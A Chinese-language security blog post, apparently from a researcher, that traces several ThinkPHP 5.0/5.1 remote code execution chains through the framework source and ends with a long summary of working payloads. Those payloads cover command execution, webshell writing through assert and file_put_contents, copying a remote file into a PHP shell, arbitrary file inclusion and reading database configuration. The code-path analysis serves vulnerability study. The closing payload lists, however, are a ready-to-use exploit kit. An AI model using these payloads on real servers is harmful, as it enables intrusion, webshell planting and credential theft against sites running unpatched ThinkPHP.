#  原创 | TP5 RCE漏洞总结   
原创 Sentiment  SecIN技术平台   2022-08-03 18:00  
  
**点击蓝字**  
  
  
  
  
**关注我们**  
  
#   
  
  
```
```  
  
  
#   
  
5.0.0<=ThinkPHP5<=5.0.23 、5.1.0<=ThinkPHP<=5.1.30  
  
不同版本payload不同，且5.13版本后还与debug模式有关  
  
这里用的是5.0.22版本  
  
ThinkPHP5.0.22完整版 - ThinkPHP框架  
  
https://www.thinkphp.cn/down/1260.html  
  
  
# 5.0.22debug模式RCE  
  
  
  
开启debug模式  
  
/config/config.php—>app_debug=>true  
  
先给payload跟一边  
```
```  
```
_method=__construct&filter=system&server[REQUEST_METHOD]=whoami
```  
```
```  
  
跟进  
run()  
，前边都是一些参数配置，直接跳到routeCheck()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZicPAvZxQVxv9HLunJBM91vsNIiaAwGUj9u2sO6MMVdoqAkEPqFlQGKWQ/640?wx_fmt=jpeg "")  
  
  
前边还是配置操作直接看check()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZia8JVfyYnz5qhf3iaClnoibiaAsSzpINodJUq5DcfFPic0JtmM7P4JFIpSw/640?wx_fmt=jpeg "")  
  
  
下边有个method()跟进一下![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZRJF3crKnt5BN0QwmLwNibhAkLtc7kic958r77QMicSQXN6WrgUk7GTSqA/640?wx_fmt=jpeg "")  
  
  
525行$this->method =  
  
strtoupper($_POST[Config::get('var_method')]);,  
  
  
获取POST传参中的var_method的值，而配置文件config.php中，它的默认值是_method,而我们POST传参的_method值是__construct，在经过strtoupper转大写  
  
  
所以$this->method=__CONSTRUCT,之后526行，  
  
就相当于执行了__construct(\$_POST)，POST值就是我们传进去的在下边  
  
  
跟进__construct()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZiaTOl1AZ162NyfLkQwEeNzlBMklXqQzJxYs5icHTKYQRwC2YCwCsYTOA/640?wx_fmt=jpeg "")  
  
  
这里本身server是没有值的，但是通过foreach语句，进行变量覆盖，最后一次循环时  
  
  
$name='server',$item=>REQUEST_METHOD=whoami,这样一来在经过$this->$name=$item后，就发生了变量覆盖  
  
即\$server=>REQUEST_METHOD=whoami  
  
即下边圈出来的值  
> 到这为了防止比较乱，先捋一下刚刚的链  
> run()->routeCheck()->check()->method()->__construct()  
  
  
执行完__construct()后回到method()，method()执行完后retrun $this->method;，  
  
  
回到check(),check()最下边会rerurn false;在回到routeCheck()，此时\$resault=false![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZ3yMkFwMqMhUhIC4nh6B1ClcaeK4wkUlGdP9liaovKQf6InhlqrMdL6g/640?wx_fmt=jpeg "")  
  
  
进入653行判断，跟进parseUrl()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZqnice0Kuiat66MicWzngjUBsUCUepCnap4Dn3oMlxrb1W0S9jQ6t6kmEg/640?wx_fmt=jpeg "")  
  
  
最后会return 一个值，其中$route跟上边三个变量有关，调试时候跟一下就好了，其实也没啥东西。执行完后retrun $resault;回到了run(),将值给了\$dispatch![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZ33TkaFl6aNGc1M13OXcWwcaQQN7iahuZw7gAHq16mw87vmia7DgODajA/640?wx_fmt=jpeg "")  
  
  
之后执行$request->dispatch($dispatch);将$dispatch的值赋给\$this->dispatch,其实这里也就是替换掉了$request中dispatch的值  
  
  
跟进param()，看过之前tp5.1反序列化话，应该对这个很熟悉了，继续跟进method(true),注意这其实就是最开始的那个method()方法，前边的那个没给参数所以默认为false，这里是true![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZBsxFibu4mnlgIRtfKS2aBqickQGt0V1EGuibzxNia7YmYOxKq2GxLR4Agg/640?wx_fmt=jpeg "")  
  
  
$method=true，所以进入第一个if，跟进server()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZoqsaB2KjmhMLhV5tt8dvUygvjd1ddPAyYlRdrkqFoIMAQKABBrO0Vw/640?wx_fmt=jpeg "")  
  
  
$this->server通过刚才的__construct()已经赋值了，所以绕过第一个if，$name的值是上图中传进的REQUEST_METHOD，是个字符串所以也不进入第二个if，下面操作就跟tp5.1反序列化的一样了，直接跟进input()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZRXm1orTuDgXJbgsVmyMsFFeEEYibCxAjbJSn3GcDEFpUNH8IpnbLiatw/640?wx_fmt=jpeg "")  
  
  
调用input时第二个参数，三目运算将大写REQUEST_METHOD，传给了input  
中的  
  
\$name,$data=就是$this->server的值  
  
  
之后经过foreach，将$name的值给  
  
$val=REQUEST_METHOD，  
  
然后$data=$data[$var]  
  
即：\$data=\$data[REQUEST_METHOD]也就等于whoami![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZrsEXJH3aR9VCmqQvTxWFowjesQMtKhBdQsIZ2sw8wMbQ0zBE3uZkeQ/640?wx_fmt=jpeg "")  
  
  
之后就是两个重点的方法getFilter(),tpRCE中常用方法filterValue()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZibwp0zOz6w4SicfBJ2B0kTdIwJQQwSpl84Lk2gicM3DLEDNKnbVhzplrQ/640?wx_fmt=jpeg "")  
  
  
先跟进getFilter()，1058行，将$this->filter的值给$filter，由于我们POST传入的是filter=system，所以现在的\$filter=system，中间过滤操作对其值无影响不看了，执行完retrun返回![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZHrdMtkA3O3xE4VNF6S9Dat8YU5iatzJ5twRC9dv42eal5OrJjchNUlA/640?wx_fmt=jpeg "")  
  
  
跟进filterValue()，$value的值就是$data的值，call_user_func执行  
  
  
最后return $this->filterExp($value); filterExp就是一个正则过滤主要过SQL的(tp3.2.3的SQL中也出现过)，对我们的值没有影响，所以执行成功并回显了![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZVmJwV27mgJoXJXFPDYjYSF7sj1CQTx7zUIvzfC8j9YxryibKWtUuWxA/640?wx_fmt=jpeg "")  
  
#   
  
# 5.0.22非debug模式RCE  
  
  
#   
  
还是先贴payload  
```
```  
```
?s=captcha
_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=dir
```  
  
非debug模式的区别就在于，之前debug模式时，可以进入if判断从而执行,param()，而非debug模式无法进入if所以执行点就到了下边的exec()  
```
```  
  
跟进exec()，会进行$dispatch['type']检测，若为method，则就可以从这里进入param()，进而命令执行![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZWhdmHnI9rvbOh6NvzZVEAaAFvFKYwgsWLmmj1Rr9VRcX1Aw7OEZXQg/640?wx_fmt=jpeg "")  
  
  
所以这里主要就在于，如何将  
  
\$dispatch['type']=method，还是先跟到method方法这里(里边执行__construct()那个就不进去了)![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZFRZtqVKYWsnDkqUpaRCic0EswJgkvI8KpLfnd4h2KboUOYFqHVmSESA/640?wx_fmt=jpeg "")  
  
  
经过method()变量覆盖,此时$method=get,在经过self::\$rules[get]给$rules赋值，结果在下边，现在问题是为什么值是这个数组呢？  
  
  
这是由于ThinkPHP有⾃动加载机制，在运⾏时会⾃动加载vendor⽬录下的第三⽅库。  
> 由于我们get传参?s=captcha，所以自动调用了think-captcha下的文件  
  
  
  
加载过程如下：  
  
vendor/topthink/think-captcha/src/helper.php中有个get方法,然后get()->rule()->setRule()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZibL4njM6OsEYHURrP4OAzVYZMn5Romia2lRIiaEHGjzP3ny2o0PscFe3w/640?wx_fmt=jpeg "")  
  
  
最终也就是相当于获得了我们get()方法中传入的参数![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZDhdGIzW887G9VQjss90Bv1m132kaFgp74iaBcJNr7RtJSaQF0CUJMpw/640?wx_fmt=jpeg "")  
  
  
回过来接着看，给$rules,赋完值后会进入checkRoute(),注意：$rules作为第二个参数传入![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZPTyWbf9m0iauKicVUd4WGGoQUH9BRTzPfsHREkuemoW9pB0Hzj8dCMYQ/640?wx_fmt=jpeg "")  
  
  
跟进后里边又有个checkRule()->parseRule()，$rules作为第二个参数传给$route,在作为第二个参数传给parseRule()的\$route  
```
```  
```
//checkRule()
$result = self::checkRule($rule, $route, $url, $pattern, $option, $depr);

//parseRule()
return self::parseRule($rule, $route, $url, $option, $match);
```  
  
跟到1517行，发现将$route赋给了$method,最后  
  
$resault中的$type变为我们想要的  
  
"method",$method变为$route的值，如图所示：  
```
```  
  
还是先捋一下整条链  
  
run()->routeCheck()->check()->checkRoute()->checkRule()->pareRule(),type=method  
  
  
都执行完后再回到run()，将刚才得到的值给了$dispatch，之后执行exec，这时我们的dispatch['type']=method,所以就执行了param()之后就跟debug模式一样了不跟进看了![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZWZpD576gvialPTYuupqcNvW78UhuqqmKFYI3fE04jjxTy0KZpjRoicjg/640?wx_fmt=jpeg "")  
  
#   
  
# 5.0-5.0.12的另一种RCE思路  
  
  
#   
  
这条链应该是只适用于5.0—5.0.12具体没有一个个审，本地测试是0、5、12的都可以，所以应该也差不多  
  
  
复现用的是5.0.5  
ThinkPHP5.0.5完整版 - ThinkPHP框架  
  
  
https://www.thinkphp.cn/down/870.html  
  
  
payload  
```
```  
```
_method=__construct&filter=system&method=GET&s=whoami
```  
  
前边非debug的RCE是利用的$dispatch['type']=method，进而命令执行的，而这条链则是用到$dispatch['type']=module，先来看下如何让他的值变为module的  
  
  
前边都是一样的，直接看routeCheck()这里![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZDqK0ia9qHtxeDV128eTHicibibl4msicq1hibA40SmTRtHzibaVbqrdZPtNvA/640?wx_fmt=jpeg "")  
  
  
跟进后原本是通过check()然后再一直调用其他方法，将type变为method的，这里在check()方法执行完后，550行有个parseUrl()  
```
```  
```
$result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
```  
  
跟进这里最后会返回type=>module，\$route其实  
  
基本没发生什么变化，具体细节就不看了  
```
```  
  
执行完后回到run()方法中的type判断这里![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZlmiawiacSbnFaBiatlPGSicOIeI9vjQA81Ny5GliapmpEdichVMgR9icOGROQ/640?wx_fmt=jpeg "")  
  
  
跟进module，该方法最后执行invokeMethod()  
```
```  
```
return self::invokeMethod($call, $vars);
```  
```
```  
```
```  
```
$args = self::bindParams($reflect, $vars);
```  
  
跟进发现了param(),这里调用时没用到任何参数，所以前边我只是一直在跟进并没有分析他的具体流程  
```
```  
  
跟进![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZJvOPZyVsnRica2Epu57XywIZibibT68GVs3a9AYwZNPAshiaVecsd4ZEUQ/640?wx_fmt=jpeg "")  
  
  
经过method()方法得到POST，然后将我们POST传入的值给$var,之后631行进行合并，这里的合并其实就是$var的值(框选部分)，因为前后的get和route方法参数都是false默认返回空，所以可以理解为\$this->param=\$vars，最后调用input  
  
  
跟进调用array_walk_recursive,$data就是input的第一个参数即：$this->param，$filter为我们传入的system![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZZRE3Jc2icWibE8ZCJt43IpvvKEf8ynZiaasYnicvyDl7IVW7xAWLJwZnWA/640?wx_fmt=jpeg "")  
  
最后直接执行了，不截图了(这个地方在tp5.1反序列化中遇到过)  
  
  
至于5.0.13后为什么不行，主要在这里，module中filter被覆盖为空![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZNpu5MVx8nruiccOEcQbj53LevsAK7McYx0BzvpZZrdicMoxBS6dYJ4mg/640?wx_fmt=jpeg "")  
  
  
  
# 未开启强制路由导致RCE  
  
  
#   
## 环境  
```
```  
```
composer create-project topthink/think=5.1.29 tp5.1.29
```  
  
我这边版本一直下载不对，没弄好就从github上直接  
  
找了个  
  
vulnspy/thinkphp-5.1.29 (github.com)  
  
https://github.com/vulnspy/thinkphp-5.1.29  
##   
## 前提  
  
未开启强制路由/config/app.php  
```
```  
```
// 是否强制使用路由
'url_route_must'         => false,
```  
  
****  
**分析**  
  
感觉下载的不是纯净源码，就简单跟一下吧  
  
老样子先进入run()![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZlYaAykzEVsdHOVMtXwHTaN8beuJswQwnKK51IWPcSn2cBU0XrZ98yA/640?wx_fmt=jpeg "")  
  
  
调用routeCheck()和init(),先跟进routeCheck()  
  
先通过path()获取传参的值![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZldqmCbaIwTX42ibrXgJ9J4icgwicUZqZosuPRN3byLickHMlhhNz0pPD2g/640?wx_fmt=jpeg "")  
  
  
跟进check(),先看881行，将$url值中的/替换成|，  
  
所以结果从一开始的index/think\Request/input  
  
变为index|think\Request/input![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZlNtJO2ibXEw8TZMQy9CbEnDRA3PTRJBU6uWhjc6OEpaOfhXMAicianRPg/640?wx_fmt=jpeg "")  
  
  
最后retrun返回  
```
```  
```
    return new UrlDispatch($this->request, $this->group, $url, [
        'auto_search' => $this->autoSearchController,
    ]);
}
```  
  
执行完后看下值，主要还是  
  
index|think\Request/input这一部分  
```
```  
  
相当于index模块，think\Request控制器，input方法。继续跟进，routeCheck()函数运行完毕，进入init()：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZbndTexIbicLyNgyZnU1Z7ZibbPwkStOzfNwrmu1BMexaQFmhuwlkp5dg/640?wx_fmt=jpeg "")  
  
48行有个parseUrlPath()跟进一下  
```
```  
```
list($path, $var) = $this->rule->parseUrlPath($url);
```  
```
```  
  
回到parseUrl(),主要执行了下边三个array_shift操作，以$module举例，$path的第一个数组为index,通过array_shift将第一个数组删除，并返回index，剩下的controller、action依次就为think\Request、input![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZMw1uiavicH6HU8EVV5Oplejm89biaKL1zO1wJibnNDvMofugyW8lQ1zmUA/640?wx_fmt=jpeg "")  
  
  
最后将这三个值赋给$route并retrun  
```
```  
```
$route = [$module, $controller, $action];

if ($this->hasDefinedRoute($route, $bind)) {
    throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
}

return $route;
```  
```
```  
```
```  
```
return (new Module($this->request, $this->rule, $result))->init();
```  
```
```  
  
跟进，在168执行exec()  
1. 先实例化了控制器，  
  
相当于实例化think\Request：  
  
1. $action这里先获得input这个方法名，  
  
1. 然后判断是否可以调用，创造\$call。  
  
1. 生成了一个ReflectionMethod反射类的对象，得到方法名。  
  
1. 利用param方法获得请求参数，即：filter=system&data=whoami  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZhlMkNTVksJ9anarWlMCszszX0s0s3KiaVWlowLpIjt1X2Gz55CyS3Xw/640?wx_fmt=jpeg "")  
  
之后有个135行invokeReflectMethod()  
```
```  
```
$data = $this->app->invokeReflectMethod($instance, $reflect, $vars);
```  
  
跟进，又发现bindParams()会retrun $args;再传给invokeArgs()调用  
  
  
invokeArgs()利用反射机制，把\$args这个数组作为参数，调用了input方法，到input就很熟悉下边就不分析了  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/xkA3iaCzeYprXWI4L266ViakwlRpnHhOaZusuibeIfa3EhwFHjbq0GdXf3iaoW8OWLKfr4X2TCHYB9hEBWLO5xtNaQ/640?wx_fmt=jpeg "")  
  
到这RCE部分就结束了，其实对于最后的未强制路由上，审计的还是不是很明白，也不知道是不是源码的问题，就是感觉有点乱这里就以后再说吧  
#   
  
# payload总结  
  
  
  
tp5RCE的payload其实还有很多，这里贴一波师傅总结payload  
##   
## 5.0-5.0.12debug无关  
  
开启debug后会执行两遍我们的命令，一次在debug模式判断那里，run()->param():126，另一个就是非debug模式下的exec()  
  
  
**命令执行**  
```
```  
```
POST 
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter//自5.0.8开始
```  
```
```  
```
```  
```
POST
s=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert
```  
  
****  
**debug模式**  
### 5.0-5.0.20  
  
准确的来说应该是5.0.13-5.0.20，因为13之前都会执行两次，不属于debug模式特有的  
```
POST 
s=whoami&_method=__construct&method=POST&filter[]=system
aaaa=whoami&_method=__construct&method=GET&filter[]=system
_method=__construct&method=GET&filter[]=system&get[]=whoami
c=system&f=calc&_method=filter//自5.0.8开始
```  
  
****  
**写shell**  
  
`fallbacks=file_put_contents('test.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert  
```
**有captcha路由时debug无关**

POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET

### 5.0.21-5.0.24、5.1.0-5.1.1

**命令执行**

```fallback
POST 
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc
```  
  
****  
**写shell**  
```
```  
```
POST
_method=__construct&filter[]=assert&server[REQUEST_METHOD]=file_put_contents('test.php','<?php phpinfo();')
```  
```
```  
  
**有captcha路由时debug无关**  
```
```  
```
POST ?s=captcha/calc
_method=__construct&filter[]=system&method=GET
POST ?s=captcha
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc&method=get
```  
```
```  
##   
## 未开启强制路由导致RCE  
  
这个漏洞的影响范围应该是  
  
ThinkPHP5<5.0.23、ThinkPHP5.1<5.1.30  
  
  
**命令执行**  
```
```  
```
5.0.x
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
5.1.x
?s=index/\think\Request/input&filter[]=system&data=whoami
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```  
```
```  
  
**shell**  
```
```  
```
5.0.x
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
5.1.x
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\view\driver\Think/display&template=<?php phpinfo();?>             //shell生成在runtime/temp/md5(template).php
?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy(%27远程地址%27,%27333.php%27)
```  
```
```  
  
**其他**  
```
```  
```
5.0.x
?s=index/think\config/get&name=database.username // 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    // 包含任意文件
?s=index/\think\Config/load&file=../../t.php     // 包含任意.php文件
```  
  
  
**往期推荐**  
  
  
  
[原创 | Golang爬虫框架初探](http://mp.weixin.qq.com/s?__biz=MzI4Mzc0MTI0Mw==&mid=2247494566&idx=1&sn=85c2b7c5e52b23ea20a4609169ab94be&chksm=eb84b6f2dcf33fe4be2f797ca751fb543048af89603e2b9f7068c00bb204734e55f5d4e3bf1f&scene=21#wechat_redirect)  
  
  
[原创 | 浅析JNDI注入](http://mp.weixin.qq.com/s?__biz=MzI4Mzc0MTI0Mw==&mid=2247494519&idx=1&sn=20c3467fa972b6a6576d76ae9d7684de&chksm=eb84b623dcf33f3582c87dd3ec272b262f2a3abff9131706a7bb4bb408c57099e919498085ea&scene=21#wechat_redirect)  
  
  
[原创 | CVE-2019-0808](http://mp.weixin.qq.com/s?__biz=MzI4Mzc0MTI0Mw==&mid=2247494467&idx=1&sn=6188bd48221567077d761d469d56cea7&chksm=eb84b617dcf33f01566c397e682fe4dfc34c0da21f026f5c723d38c73a7e94db582ea965f4b2&scene=21#wechat_redirect)  
  
  
